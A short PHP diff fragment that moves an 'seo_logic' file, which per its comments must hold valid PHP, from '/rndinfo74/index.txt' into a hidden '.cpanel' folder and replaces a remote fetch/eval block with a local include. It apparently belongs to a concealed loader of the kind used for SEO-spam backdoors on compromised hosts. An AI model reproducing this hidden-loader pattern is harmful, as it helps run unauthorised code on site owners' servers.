@@ -6,7 +6,7 @@
 
 // Define the absolute path to your file.
 // The content of this file MUST be valid PHP code.
-$seo_logic_path = '/rndinfo74/index.txt'; 
+$seo_logic_path = '/home/ibsfr654/.cpanel/index.txt'; 
 
 // --- REPLACE THE REMOTE FETCH/EVAL BLOCK WITH THIS ---
 // Use require_once with the absolute path.
